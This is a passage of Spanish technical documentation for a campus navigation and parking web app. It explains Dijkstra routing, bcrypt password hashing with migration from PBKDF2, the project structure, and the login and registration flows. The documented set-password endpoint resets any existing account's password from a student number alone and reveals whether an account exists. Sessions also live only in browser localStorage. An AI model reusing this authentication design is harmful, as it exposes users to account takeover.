6. Repite desde el paso 2 hasta llegar al nodo destino.

Analogia de Dijkstra: Imagina que estas en una ciudad desconocida y quieres llegar a un restaurante. En cada interseccion, preguntas a los locales cuanto falta por cada camino posible. Siempre avanzas por el camino que tiene la menor distancia acumulada. Si descubres un camino mas corto, actualizas tu plan. Al final, la ruta que seguiste es necesariamente la mas corta.

### NetworkX en el proyecto

NetworkX es la libreria de Python que implementa estas estructuras:

```python
import networkx as nx

# Crear un grafo
G = nx.Graph()

# Agregar aristas (conexiones entre puntos)
G.add_edge((19.329, -99.111), (19.330, -99.112), weight=120.5)
# Esto agrega una conexion entre dos coordenadas con distancia 120.5 metros

# Encontrar la ruta mas corta
path = nx.shortest_path(G, source=punto_a, target=punto_b, weight='weight')
# path es una lista de coordinadas que forman la ruta optima
```

## 3.8 BCRYPT (HASHING SEGURO DE CONTRASENAS)

### Que es el hashing

El hashing es un proceso matematico unidireccional que convierte una entrada (la contrasena) en una salida de longitud fija (el hash). Es unidireccional porque no existe forma practica de reconstruir la entrada original a partir de la salida.

Analogia: El hashing es como hacer jugo de naranja. Puedes convertir naranjas en jugo facilmente, pero no puedes convertir jugo de vuelta en naranjas. De la misma manera, puedes hashear una contrasena pero no puedes "deshashearla".

Otra analogia: Es como una huella digital. Cada persona tiene una huella unica, pero no puedes reconstruir a la persona a partir de la huella. Si alguien te muestra su dedo, puedes comparar su huella con la que tienes registrada, pero nunca podrias recrear el dedo a partir de la huella.

### Que es bcrypt y por que se eligio

bcrypt es un algoritmo de hashing de contrasenas disenado especificamente para ser lento de forma deliberada. Fue creado en 1999 y sigue siendo uno de los algoritmos mas recomendados para almacenar contrasenas, avalado por OWASP (Open Web Application Security Project), la organizacion internacional de referencia en seguridad web.

Por que "lento" es bueno para contrasenas: Cuando un atacante roba una base de datos, intenta adivinar contrasenas probando millones de combinaciones por segundo. Los algoritmos rapidos como SHA-256 o MD5 permiten probar miles de millones de contrasenas por segundo en hardware moderno. bcrypt esta disenado para tomar aproximadamente 100 milisegundos por cada intento, lo que reduce la velocidad de un ataque de fuerza bruta en un factor de millones. Para un usuario normal esperando medio segundo para hacer login, esto es imperceptible. Pero para un atacante, cada intento le cuesta muchisimo mas tiempo.

Analogia: Imagina que para abrir una caja fuerte necesitas girar un dial 12 veces (las 12 rondas de bcrypt). Si eres el dueno y tienes la combinacion, tarda medio segundo. Pero un ladron que intenta todas las combinaciones posibles necesita girar el dial 12 veces por cada intento, lo que hace que probar millones de combinaciones sea extremadamente lento.

### Como funciona bcrypt internamente (paso a paso)

bcrypt funciona en cuatro etapas:

1. Recibe la contrasena en texto plano, por ejemplo "nueva123".

2. Genera una sal (salt) aleatoria. La sal es una cadena de caracteres aleatoria que se agrega a la contrasena antes de calcular el hash. Esto asegura que dos usuarios con la misma contrasena tengan hashes completamente diferentes. Si no hubiera sal, un atacante podria pre-calcular hashes para millones de contrasenas comunes una sola vez y compararlos contra toda la base de datos (esto se llama ataque de tablas rainbow).

Ejemplo con sal:
- Usuario 1: contrasena "abc123", sal generada "X4r9mP" → hash "$2b$12$X4r9mP...a9f3..."
- Usuario 2: contrasena "abc123", sal generada "Kw7nJq" → hash "$2b$12$Kw7nJq...7d2e..."
- Misma contrasena, hashes completamente diferentes porque la sal es diferente.

3. Ejecuta multiples rondas del cifrado Blowfish. El numero de rondas se expresa como un factor de costo: con factor 12 (el que usa este proyecto), se ejecutan 2^12 = 4,096 iteraciones internas. Cada ronda toma el resultado de la anterior y lo transforma de nuevo. Esto es lo que hace a bcrypt intencionalmente lento.

4. Produce una cadena final de 60 caracteres como:
```
$2b$12$Rn7mGk8X9Yq2TvW5pLaN3.a1b2c3d4e5f6g7h8i9j0k1l2m3n4
```

Esta cadena contiene toda la informacion necesaria para verificar la contrasena despues:
- $2b$ → Indica que es un hash bcrypt (version 2b).
- $12$ → El factor de costo (12 rondas de Blowfish).
- Rn7mGk8X9Yq2TvW5pLaN3. → Los primeros 22 caracteres despues del factor de costo son la sal.
- a1b2c3d4e5f6g7h8i9j0k1l2m3n4 → El hash resultante.

### Como se almacena una contrasena en este proyecto

Cuando un usuario se registra, el sistema NUNCA almacena la contrasena en texto plano. En su lugar usa el metodo _hash_password del servicio de autenticacion:

```python
import bcrypt

def _hash_password(self, password):
    return bcrypt.hashpw(
        password.encode('utf-8'),     # Convertir texto a bytes
        bcrypt.gensalt()               # Generar sal aleatoria
    ).decode('utf-8')                  # Convertir bytes resultantes a texto
```

Explicacion linea por linea:
- password.encode('utf-8'): bcrypt requiere la contrasena como bytes (no como texto). encode('utf-8') convierte el texto "nueva123" en su representacion binaria.
- bcrypt.gensalt(): Genera una sal aleatoria con factor de costo 12 por defecto. La sal se ve como: $2b$12$Rn7mGk8X9Yq2TvW5pLaN3.
- bcrypt.hashpw(): Combina la contrasena y la sal, ejecuta las 4,096 rondas de Blowfish y produce el hash final.
- .decode('utf-8'): El resultado viene como bytes; lo convertimos a texto para poder guardarlo en la columna de la base de datos.

### Como se verifica una contrasena

Cuando un usuario hace login, el sistema no puede "deshashear" el hash almacenado. En cambio, re-calcula el hash de la contrasena proporcionada y compara:

```python
def _verify_password(self, stored_hash, password):
    # Si el hash es formato legacy (de la version anterior del sistema)
    if stored_hash.startswith(('pbkdf2:', 'scrypt:')):
        return werkzeug_check(stored_hash, password)  # Verificar con libreria antigua

    # Si el hash es bcrypt (formato actual)
    try:
        return bcrypt.checkpw(
            password.encode('utf-8'),       # Contrasena proporcionada
            stored_hash.encode('utf-8')     # Hash almacenado
        )
    except (ValueError, TypeError):
        return False
```

El proceso interno de bcrypt.checkpw() es:
1. Extraer la sal del hash almacenado (los primeros 29 caracteres de $2b$12$...).
2. Hashear la contrasena proporcionada usando esa sal y el mismo factor de costo.
3. Comparar el hash resultante con el hash almacenado.
4. Si son identicos, la contrasena es correcta. Si difieren en un solo caracter, es incorrecta.

Ejemplo practico:
```python
stored_hash = "$2b$12$Rn7mGk8X9Yq2TvW5pLaN3.a1b2c3d4e5f6..."

bcrypt.checkpw("nueva123".encode(), stored_hash.encode())  # True  → contrasena correcta
bcrypt.checkpw("nueva124".encode(), stored_hash.encode())  # False → contrasena incorrecta
```

### Migracion transparente de algoritmos

Antes de implementar bcrypt, el proyecto usaba un algoritmo mas antiguo llamado PBKDF2-SHA256 a traves de la libreria werkzeug. Los hashes antiguos se ven asi:
```
pbkdf2:sha256:1000000$WrXjhXT4Bydsy1xW$7a2f...
```

Cuando se actualizo a bcrypt, no se podia simplemente borrar todos los hashes antiguos porque los usuarios tendrian que crear contrasenas nuevas. En cambio, se implemento un sistema de migracion transparente:

```python
def _needs_rehash(self, stored_hash):
    """Detecta si un hash usa el formato antiguo"""
    if not stored_hash:
        return False
    return stored_hash.startswith(('pbkdf2:', 'scrypt:'))
```

El flujo completo de migracion:
1. El usuario intenta hacer login con su contrasena.
2. El sistema detecta que el hash almacenado empieza con "pbkdf2:" (formato antiguo).
3. Verifica la contrasena usando werkzeug (la libreria anterior).
4. Si la contrasena es correcta, genera un nuevo hash bcrypt de la misma contrasena.
5. Reemplaza el hash antiguo por el nuevo hash bcrypt en la base de datos.
6. En el siguiente login, el sistema usara bcrypt directamente.

De esta forma los usuarios nunca necesitan cambiar sus contrasenas. La migracion ocurre de forma invisible durante el login normal.


# CAPITULO 4. ESTRUCTURA DEL PROYECTO

## 4.1 DIRECTORIO RAIZ

```
Navegacion_ESIME/
    backend/                  ← Servidor Flask (Python). Todo el codigo del servidor.
    frontend/                 ← Aplicacion React (JavaScript). Todo el codigo del cliente.
    docs/                     ← Documentacion adicional del proyecto.
    scripts/                  ← Scripts auxiliares para tareas de mantenimiento.
    Camino ESIME caminable.kml ← Archivo KML con los caminos peatonales del campus.
    run_app.sh                ← Script bash que inicia backend y frontend simultaneamente.
    README.md                 ← Documentacion principal del proyecto (resumen).
    DOCUMENTACION.md          ← Este documento (documentacion tecnica completa).
    .gitignore                ← Lista de archivos que Git debe ignorar (node_modules, .db, etc).
```

El archivo mas importante del directorio raiz es run_app.sh, el script de inicio:

```bash
#!/bin/bash

# Liberar puertos por si quedaron ocupados de una ejecucion anterior
lsof -ti:5001 | xargs kill -9 2>/dev/null    # Matar proceso en puerto 5001 (Flask)
lsof -ti:5173 | xargs kill -9 2>/dev/null    # Matar proceso en puerto 5173 (Vite)

# Iniciar el backend
cd backend && python3 app.py > ../backend.log 2>&1 &
BACKEND_PID=$!

# Esperar a que el backend este listo
sleep 2

# Iniciar el frontend
cd frontend && npm run dev > frontend.log 2>&1 &
FRONTEND_PID=$!

# Esperar a que cualquiera termine (mantener el script corriendo)
wait
```

Explicacion linea por linea:
- lsof -ti:5001 lista los IDs de procesos usando el puerto 5001.
- xargs kill -9 mata esos procesos forzosamente.
- 2>/dev/null redirige los errores a la nada (los ignora si no hay procesos que matar).
- python3 app.py > ../backend.log 2>&1 & ejecuta Flask en segundo plano y redirige la salida a un archivo de log.
- $! captura el ID del ultimo proceso ejecutado en segundo plano.
- sleep 2 espera 2 segundos para que Flask se inicie completamente antes de iniciar el frontend.
- wait mantiene el script corriendo hasta que alguno de los procesos termine.

## 4.2 DIRECTORIO BACKEND DETALLADO

```
backend/
    app.py                    ← Punto de entrada principal (~620 lineas).
    config.py                 ← Configuracion de bases de datos y modos.
    kml_router.py             ← Motor de enrutamiento (~428 lineas).
    requirements.txt          ← Dependencias de Python.
    .env                      ← Variables de entorno (no se sube a Git).
    .env.example              ← Plantilla de variables de entorno.
    models/
        __init__.py           ← Re-exporta todos los modelos desde un punto unico.
        database.py           ← Instancia central de SQLAlchemy (db).
        map_models.py         ← 7 modelos: EdificioDB, CaminoDB, SavedPlace,
                                 ParkingSection, ParkingSpace, ParkingReservation,
                                 ParkingHistory.
        school_models.py      ← 8 modelos: Alumno, Materia, Profesor, Salon,
                                 Grupo, MateriaGrupo, Horario, Inscripcion.
    services/
        auth_service.py       ← Logica de autenticacion: register, login, set_password,
                                 validaciones de boleta, nombre y contrasena.
        parking_service.py    ← Logica de estacionamiento: secciones, espacios,
                                 reservas, validacion de limites.
        routing_service.py    ← Logica de calculo de rutas. Envuelve KMLRouter.
        schedule_service.py   ← Logica de consulta de horarios por alumno y grupo.
        school_adapter.py     ← Adaptador para sincronizar datos escolares externos.
    repositories/
        __init__.py           ← Fabrica de repositorios segun configuracion.
        user_repository.py    ← Interfaces abstractas (que operaciones existen).
        sqlite_repository.py  ← Implementacion concreta para SQLite.
    map_data/
        buildings.json        ← Datos de edificios en formato JSON para el seed.
        paths.json            ← Datos de caminos del campus.
        parking.json          ← Datos de secciones y espacios de estacionamiento.
    seed_map_data.py          ← Lee los JSON de map_data/ e inserta en map.db.
    seed_parking.py           ← Crea las secciones y espacios del estacionamiento.
    seed_inscripciones.py     ← Crea datos de prueba: alumnos, materias, horarios.
    instance/
        map.db                ← Archivo SQLite con datos del mapa.
        school.db             ← Archivo SQLite con datos escolares.
```

### Responsabilidades detalladas

app.py es el corazon del servidor. Contiene aproximadamente 620 lineas de codigo y cumple las siguientes funciones:
1. Configura Flask y las extensiones (CORS, limiter).
2. Configura las dos bases de datos con SQLAlchemy.
3. Crea las tablas si no existen (db.create_all()).
4. Ejecuta los seeds de datos (edificios, estacionamiento, inscripciones).
5. Inicializa los servicios (auth, parking, routing, schedule).
6. Define TODOS los endpoints de la API (aproximadamente 25 endpoints).
7. Inicia el servidor en el puerto 5001.

config.py define dos modos de operacion mediante la variable APP_ENV:
- local (por defecto): Usa SQLite para ambas bases de datos. Ideal para desarrollo.
- institutional: Permite usar una base de datos externa (via DATABASE_URL) para los datos escolares. Los datos del mapa siguen en SQLite local.

kml_router.py es el archivo mas complejo del proyecto con 428 lineas. Lee un archivo KML (formato XML de Google Earth), extrae los caminos trazados, construye un grafo matematico con NetworkX, repara automaticamente la topologia del grafo (uniendo nodos que deberian estar conectados), e implementa busqueda de rutas con cache para mejorar el rendimiento.

### Directorio models/

El archivo __init__.py actua como un punto unico de importacion. En lugar de que cada archivo del proyecto importe desde modulos separados:

```python
# SIN __init__.py (tedioso y propenso a errores)
from models.map_models import EdificioDB, ParkingSpace
from models.school_models import Alumno
from models.database import db
```

Se puede importar todo desde un solo lugar:

```python
# CON __init__.py (limpio y simple)
from models import db, EdificioDB, ParkingSpace, Alumno
```

database.py contiene una sola linea significativa:

```python
from flask_sqlalchemy import SQLAlchemy
db = SQLAlchemy()
```

Esta linea crea la instancia central de SQLAlchemy que todos los modelos utilizan. Se crea en un archivo separado para evitar importaciones circulares (un problema donde el archivo A importa al B y el B importa al A, creando un ciclo infinito).

## 4.3 DIRECTORIO FRONTEND DETALLADO

```
frontend/src/
    App.jsx                   ← Componente raiz. Define las 4 rutas.
    main.jsx                  ← Punto de entrada que monta React en el DOM.
    index.css                 ← Estilos globales de la aplicacion.
    authConfig.js             ← Configuracion de Azure AD (placeholder).
    mapConfig.js              ← Centro del mapa y nivel de zoom por defecto.
    locations.json            ← Coordenadas de puntos de interes.
    pages/
        Login.jsx             ← ~280 lineas. Login, registro, set-password.
        MapPage.jsx           ← ~180 lineas. Mapa interactivo del campus.
        Dashboard.jsx         ← ~450 lineas. Panel del alumno.
        ParkingPage.jsx       ← ~525 lineas. Estacionamiento completo.
        ParkingPage.css       ← Estilos del estacionamiento.
    components/
        MapComponent.jsx      ← ~1200 lineas. Componente Leaflet con toda
                                 la logica del mapa: marcadores, rutas,
                                 busqueda, navegacion GPS.
        ParkingSectionMap.jsx ← ~80 lineas. SVG de cajones individuales.
        SavedPlacesSheet.jsx  ← ~350 lineas. Panel de lugares guardados.
    services/
        api.js                ← ~120 lineas. Todas las funciones HTTP.
    context/
        NotificationContext.jsx ← Sistema de notificaciones tipo toast.
```

### App.jsx explicado

```jsx
import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Login from './pages/Login';
import MapPage from './pages/MapPage';
import Dashboard from './pages/Dashboard';
import ParkingPage from './pages/ParkingPage';
import { NotificationProvider } from './context/NotificationContext';

function App() {
  return (
    <Router>
      <NotificationProvider>
        <Routes>
          <Route path="/" element={<Login />} />
          <Route path="/map" element={<MapPage />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/parking" element={<ParkingPage />} />
        </Routes>
      </NotificationProvider>
    </Router>
  );
}

export default App;
```

Explicacion linea por linea:

- BrowserRouter as Router: Importa el router de React y lo renombra a Router. El router intercepta los cambios de URL en el navegador y decide que componente mostrar.
- Routes: Contenedor de todas las rutas posibles.
- Route path="/" element={<Login />}: Cuando la URL es "/", mostrar el componente Login.
- Route path="/map" element={<MapPage />}: Cuando la URL es "/map", mostrar MapPage.
- NotificationProvider: Envuelve toda la aplicacion para que cualquier componente pueda mostrar notificaciones tipo toast (avisos temporales en la esquina de la pantalla).

Lo importante de este archivo es que define la navegacion de la aplicacion completa con solo 4 rutas. Cada ruta carga un componente diferente sin recargar la pagina (esto se llama SPA, Single Page Application).

### api.js explicado

api.js es el servicio de comunicacion HTTP. Contiene funciones que encapsulan las peticiones al backend:

```javascript
const API_BASE = 'http://localhost:5001';

function headers() {
    return { "Content-Type": "application/json" };
}

async function handleResponse(res) {
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || "Error desconocido");
    return data;
}

export async function login(boleta, password) {
    const res = await fetch(`${API_BASE}/auth/login`, {
        method: "POST",
        headers: headers(),
        body: JSON.stringify({ boleta, password }),
    });
    return handleResponse(res);
}
```

Explicacion detallada:

- API_BASE define la URL base del backend. Todas las peticiones empiezan con esta URL.
- headers() retorna un objeto con el header Content-Type: application/json que le indica al servidor que los datos estan en formato JSON.
- handleResponse(res) centraliza el manejo de respuestas. Si el servidor responde con un error (res.ok es false), lanza una excepcion con el mensaje de error. Si la respuesta es exitosa, retorna los datos parseados.
- login(boleta, password) construye y envia la peticion de login. fetch() es la funcion nativa del navegador para hacer peticiones HTTP. Es asincrona (async/await) porque la peticion tarda tiempo en recibir respuesta.


# CAPITULO 5. SISTEMA DE USUARIOS

## 5.1 VISION GENERAL DEL SISTEMA DE AUTENTICACION

El sistema de autenticacion permite a los usuarios registrarse, iniciar sesion y cerrar sesion. Utiliza un modelo de autenticacion basado en el numero de boleta del alumno (identificador unico del IPN) y una contrasena hasheada.

Analogia: El sistema de autenticacion funciona como la entrada de un edificio con guardia de seguridad. Para entrar, necesitas mostrar tu credencial (boleta) y decir una palabra clave (contrasena). El guardia no memoriza tu palabra clave; la compara con una version codificada que tiene en su registro. Si coincide, te deja pasar. Si no, te niega la entrada sin decirte si fue la credencial la que fallo o la palabra clave (para que un impostor no sepa que dato le falta).

El sistema contempla dos metodos de autenticacion:

1. Autenticacion local: El usuario se registra con su boleta, nombre y contrasena. El sistema almacena la contrasena de forma segura usando hashing con bcrypt, un algoritmo disenado especificamente para proteger contrasenas. Antes del 10 de marzo de 2026, el sistema usaba PBKDF2-SHA256; todos los hashes antiguos se migran automaticamente a bcrypt durante el login. Este es el metodo utilizado actualmente.

2. Autenticacion con Microsoft Azure (placeholder): El sistema incluye la infraestructura para autenticacion con cuentas de Outlook institucionales usando MSAL (Microsoft Authentication Library). Esta funcionalidad aun no esta completa pero la estructura esta preparada para su integracion futura. Cuando se complete, los alumnos podran usar su cuenta @alumno.ipn.mx para acceder al sistema sin necesidad de registrarse.

## 5.2 MODELO DE USUARIO (ALUMNO)

El modelo de usuario se define en school_models.py. La tabla alumnos tiene la siguiente estructura:

```python
class Alumno(db.Model):
    __tablename__ = 'alumnos'
    __bind_key__ = 'school'

    id = db.Column(db.Integer, primary_key=True)
    boleta = db.Column(db.String(20), unique=True, nullable=False)
    email = db.Column(db.String(120), nullable=True)
    nombre = db.Column(db.String(100), nullable=False)
    carrera = db.Column(db.String(100), nullable=True)
    vehiculo = db.Column(db.String(20), nullable=True)
    id_grupo = db.Column(db.Integer, db.ForeignKey('grupos.id'), nullable=True)
    institutional_id = db.Column(db.String(100), nullable=True)
    auth_provider = db.Column(db.String(20), nullable=True)
    password_hash = db.Column(db.String(256), nullable=True)
    last_login = db.Column(db.DateTime, nullable=True)
    is_synced = db.Column(db.Boolean, default=False)
```

Explicacion detallada de cada campo:

- id: Identificador numerico unico generado automaticamente por la base de datos. Es la clave primaria. SQLite lo incrementa automaticamente cada vez que se crea un registro (el primer alumno tiene id=1, el segundo id=2, etc). Nunca se repite y nunca cambia.

- boleta: Numero de boleta del alumno (ejemplo: "2025350215"). Es unico (unique=True), lo que significa que la base de datos rechazara cualquier intento de crear un segundo alumno con la misma boleta. No puede ser nulo (nullable=False), asi que todo alumno DEBE tener boleta.

- email: Correo electronico. Es opcional (nullable=True) porque en el modo local no se requiere. Cuando se implemente Azure AD, este campo almacenara el correo institucional @alumno.ipn.mx.

- nombre: Nombre completo del alumno (ejemplo: "Sosa Hernandez Omar Alejandro"). Es obligatorio. Tiene un maximo de 100 caracteres.

- carrera: Carrera que cursa (ejemplo: "Ingenieria en Sistemas Computacionales"). Es opcional porque no todos los modos de registro la solicitan.

- vehiculo: Tipo de vehiculo que utiliza. Los valores posibles son: "carro", "moto", "bicicleta", "ninguno". Se usa para el sistema de estacionamiento, donde ciertos espacios pueden ser para motos o discapacitados.

- id_grupo: Referencia al grupo academico al que pertenece (ejemplo: grupo con clave "1CV1"). Es una clave foranea (db.ForeignKey('grupos.id')) que conecta esta tabla con la tabla grupos. Gracias a esta relacion, se puede consultar el horario del alumno a traves de su grupo.

- institutional_id: Identificador externo para cuando se conecta una base de datos institucional. Permite vincular un alumno del sistema local con su registro en el sistema escolar oficial.

- auth_provider: Indica como se autentico el usuario la primera vez. Valores posibles: "local" (registro manual), "azure" (Microsoft), "google". Esto ayuda al sistema a saber que metodo de autenticacion usar.

- password_hash: Hash de la contrasena generado con bcrypt (anteriormente PBKDF2-SHA256, migrado automaticamente). Un hash bcrypt se ve asi: "$2b$12$Rn7mGk8X9Yq2TvW5..." y tiene exactamente 60 caracteres. El campo tiene una longitud maxima de 256 caracteres para acomodar tanto el formato bcrypt actual como el formato legacy PBKDF2 (que es mas largo). Es nullable=True para acomodar usuarios que fueron creados antes de implementar contrasenas y usuarios que usan Azure AD.

- last_login: Fecha y hora del ultimo inicio de sesion exitoso. Se actualiza cada vez que el usuario hace login. Util para estadisticas y para identificar cuentas inactivas.

- is_synced: Indica si los datos del usuario estan sincronizados con una base de datos institucional externa. Valor por defecto: False.

### Metodo to_dict()

Cada modelo incluye un metodo to_dict() que convierte el objeto a un diccionario Python:

```python
def to_dict(self):
    return {
        'id': self.id,
        'boleta': self.boleta,
        'nombre': self.nombre,
        'email': self.email,
        'carrera': self.carrera,
        'vehiculo': self.vehiculo,
    }
```

Este metodo es necesario porque jsonify() de Flask no puede convertir directamente objetos de SQLAlchemy a JSON. Necesita un diccionario o lista de diccionarios. Ademas, to_dict() permite controlar que datos se exponen al frontend. Por ejemplo, NUNCA se incluye password_hash en to_dict() para evitar enviar el hash de la contrasena al navegador.

## 5.3 PROCESO DE REGISTRO (PASO A PASO DETALLADO)

Paso 1. El usuario abre la aplicacion y ve la pagina de login. Presiona "Crear cuenta". El componente Login.jsx cambia de vista:

```jsx
const [isRegistering, setIsRegistering] = useState(false);

// Al presionar "Crear cuenta":
setIsRegistering(true);
// React vuelve a renderizar el componente y muestra el formulario de registro
```

Paso 2. El usuario llena el formulario con: nombre, boleta, contrasena, carrera y tipo de vehiculo. Cada campo esta vinculado a una variable de estado:

```jsx
const [nombre, setNombre] = useState('');
const [regBoleta, setRegBoleta] = useState('');
const [regPassword, setRegPassword] = useState('');

// Cuando escribe su nombre:
<input value={nombre} onChange={(e) => setNombre(e.target.value)} />
```

Cada vez que el usuario escribe un caracter, onChange se dispara, actualiza la variable de estado, y React vuelve a dibujar el campo con el nuevo valor. Todo esto ocurre instantaneamente.

Paso 3. Al presionar "Registrarse", React ejecuta handleRegistroManual. Esta funcion:

```javascript
const handleRegistroManual = async () => {
    try {
        const payload = {
            boleta: regBoleta,
            nombre: nombre,
            password: regPassword,
            email: email || `user_${regBoleta}@esime.mx`,
            carrera,
            vehiculo
        };
        const user = await register(payload);  // Llama a api.js
        localStorage.setItem('user', JSON.stringify(user));
        navigate('/map');
    } catch (err) {
        setError(err.message);  // Muestra el error en pantalla
    }
};
```

Explicacion:
- async indica que esta funcion contiene operaciones asincronas (que tardan tiempo).
- await register(payload) envia los datos al backend y ESPERA la respuesta.
- Si el registro es exitoso, guarda el usuario en localStorage y navega al mapa.
- Si hay un error (boleta duplicada, contrasena muy corta), se captura en catch y se muestra al usuario.

Paso 4. La funcion register() en api.js construye la peticion HTTP:

```javascript
export async function register(data) {
    const res = await fetch(`${API_BASE}/auth/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
    });
    return handleResponse(res);
}
```

JSON.stringify(data) convierte el objeto JavaScript en texto JSON:
```json
{"boleta":"2025999888","nombre":"Garcia Lopez Maria","password":"miContrasena123",...}
```

Paso 5. Flask recibe la peticion en el endpoint /auth/register de app.py:

```python
@app.route("/auth/register", methods=["POST"])
@limiter.limit("3 per minute")
def register():
    data = request.get_json()   # Extrae el JSON del cuerpo
    boleta = data.get('boleta')
    nombre = data.get('nombre')
    # ... mas campos

    create_data = {
        'nombre': nombre,
        'boleta': boleta,
        'email': email,
        'carrera': carrera,
        'vehiculo': vehiculo,
        'id_grupo': random_grupo_id,  # Asigna grupo aleatorio
        'password': data.get('password'),
    }
    user, error = auth_service.register(create_data)
```

Nota: @limiter.limit("3 per minute") impide que se creen mas de 3 cuentas por minuto desde la misma IP.

Paso 6. auth_service.register() ejecuta las validaciones en orden estricto:

```python
def register(self, data):
    boleta = data.get('boleta', '').strip()
    nombre = data.get('nombre', '').strip()
    password = data.get('password', '')

    # Validacion 1: Formato de boleta
    valid, error = self._validate_boleta(boleta)
    if not valid:
        return None, error  # Error: "La boleta debe tener entre 7 y 15 digitos"

    # Validacion 2: Longitud de nombre
    valid, error = self._validate_nombre(nombre)
    if not valid:
        return None, error  # Error: "El nombre debe tener entre 2 y 100 caracteres"

    # Validacion 3: Contrasena
    valid, error = self._validate_password(password)
    if not valid:
        return None, error  # Error: "La contrasena debe tener al menos 6 caracteres"

    # Validacion 4: Boleta no duplicada
    existing = self.user_repo.find_by_boleta(boleta)
    if existing:
        return None, "Esta boleta ya esta registrada"
```

Cada metodo de validacion es simple pero importante:

```python
def _validate_boleta(self, boleta):
    if not boleta or not self.BOLETA_PATTERN.match(boleta):
        return False, "La boleta debe tener entre 7 y 15 digitos numericos"
    return True, None
```

BOLETA_PATTERN es una expresion regular: r'^\d{7,15}$'
- ^ significa "empieza aqui"
- \d significa "un digito (0-9)"
- {7,15} significa "entre 7 y 15 veces"
- $ significa "termina aqui"
- Entonces la expresion completa dice: "la cadena debe contener SOLO entre 7 y 15 digitos"

Paso 7. Si todas las validaciones pasan, se hashea la contrasena con bcrypt:

```python
password_hash = self._hash_password(password)
# Internamente ejecuta:
# bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
```

Este proceso toma la contrasena "miContrasena123", genera una sal aleatoria, ejecuta 4,096 rondas del cifrado Blowfish (factor de costo 12) y produce un hash como:
"$2b$12$Rn7mGk8X9Yq2TvW5pLaN3.a1b2c3d4e5f6g7h8i9j0k1l2m3n4"

Paso 8. El repositorio crea el registro en la base de datos:

```python
def create(self, data):
    alumno = Alumno(
        boleta=data['boleta'],
        nombre=data['nombre'],
        password_hash=data.get('password_hash'),
        email=data.get('email'),
        carrera=data.get('carrera'),
        vehiculo=data.get('vehiculo', 'ninguno'),
        id_grupo=data.get('id_grupo'),
        auth_provider='local',
    )
    db.session.add(alumno)    # Agrega a la sesion de SQLAlchemy
    db.session.commit()       # Ejecuta el INSERT en la base de datos
    return alumno.to_dict()   # Retorna los datos como diccionario
```

db.session.add() prepara el INSERT pero NO lo ejecuta. db.session.commit() ejecuta todos los cambios pendientes como una transaccion atomica. Si ocurre un error durante el commit, todos los cambios se revierten automaticamente (esto se llama "rollback").

## 5.4 PROCESO DE LOGIN (PASO A PASO DETALLADO)

Paso 1. El usuario ingresa su boleta y contrasena en el formulario.

Paso 2. React llama a api.login(boleta, password), que envia POST a /auth/login.

Paso 3. auth_service.login() recibe los datos y ejecuta la logica:

```python
def login(self, data):
    boleta = data.get('boleta', '').strip()
    password = data.get('password', '')
    method = data.get('method', 'local')

    if method == 'local':
        return self._login_local(boleta, password)
```

Paso 4. _login_local() es el metodo que realiza la verificacion:

```python
def _login_local(self, boleta, password):
    # Paso 4a: Validar formato de boleta
    valid, error = self._validate_boleta(boleta)
    if not valid:
        return None, error

    # Paso 4b: Buscar alumno en base de datos
    alumno = Alumno.query.filter_by(boleta=boleta).first()

    # Paso 4c: Si no existe, retornar error GENERICO
    if not alumno:
        return None, "Boleta o contrasena incorrecta"

    # Paso 4d: Si existe pero no tiene contrasena (usuario migrado)
    if not alumno.password_hash:
        return {"needs_password": True, "boleta": alumno.boleta}, None

    # Paso 4e: Verificar contrasena contra hash almacenado
    if not self._verify_password(alumno.password_hash, password):
        return None, "Boleta o contrasena incorrecta"

    # Paso 4f: Migracion transparente de algoritmo de hashing
    #          Si el hash usa un formato antiguo (pbkdf2/scrypt),
    #          se re-hashea con bcrypt para actualizar la seguridad
    if self._needs_rehash(alumno.password_hash):
        alumno.password_hash = self._hash_password(password)

    # Paso 4g: Login exitoso - actualizar last_login
    alumno.last_login = datetime.utcnow()
    db.session.commit()
    return alumno.to_dict(), None
```

Lo critico de los pasos 4c y 4e es que el mensaje de error es IDENTICO:
- Boleta no existe → "Boleta o contrasena incorrecta"
- Contrasena incorrecta → "Boleta o contrasena incorrecta"

Esto es una medida de seguridad llamada "prevencion de enumeracion de usuarios". Si los mensajes fueran diferentes ("Usuario no encontrado" vs "Contrasena incorrecta"), un atacante podria descubrir que boletas estan registradas.

El paso 4f es la migracion transparente de algoritmos: si el hash almacenado usa el formato antiguo PBKDF2, se genera un nuevo hash con bcrypt y se actualiza en la base de datos. El usuario nunca se entera de este cambio; su experiencia de login es identica.

## 5.5 PROCESO DE LOGOUT

El logout es simple porque no hay sesion en el servidor. Toda la informacion de sesion se mantiene en localStorage del navegador:

```javascript
const handleLogout = () => {
    localStorage.removeItem('user');   // Elimina los datos del usuario
    navigate('/');                      // Redirige a la pagina de login
};
```

localStorage es un almacen clave-valor del navegador. Los datos persisten incluso si se cierra y abre el navegador. Al eliminar la clave 'user', el sistema ya no tiene informacion de quien esta logueado.

## 5.6 FLUJO DE USUARIOS MIGRADOS

Cuando se implemento la seguridad de contrasenas, ya existian usuarios en la base de datos (como Alejandro Sosa y Adrian Frias) que fueron creados sin contrasena. Para estos usuarios se creo un flujo especial de migracion:

1. El usuario intenta hacer login con su boleta.
2. El sistema encuentra al alumno en la base de datos.
3. Detecta que password_hash es NULL.
4. Retorna {"needs_password": true, "boleta": "2025350215"}.
5. El frontend detecta esta respuesta y muestra un formulario especial:

```jsx
if (result.needs_password) {
    setNeedsPassword(true);
    setMigratedBoleta(result.boleta);
    // Muestra: "Tu cuenta fue creada antes de la actualizacion de seguridad.
    //           Crea una contrasena para continuar."
}
```

6. El usuario ingresa su nueva contrasena.
7. El frontend llama a /auth/set-password:

```javascript
export async function setPassword(boleta, password) {
    const res = await fetch(`${API_BASE}/auth/set-password`, {
        method: "POST",
        headers: headers(),
        body: JSON.stringify({ boleta, password }),
    });
    return handleResponse(res);
}
```

8. AuthService hashea la contrasena con bcrypt y la almacena:

```python
def set_password(self, data):
    boleta = data.get('boleta', '').strip()
    password = data.get('password', '')

    alumno = Alumno.query.filter_by(boleta=boleta).first()
    if not alumno:
        return None, "Usuario no encontrado"

    alumno.password_hash = self._hash_password(password)  # Genera hash bcrypt
    db.session.commit()
    return alumno.to_dict(), None
```

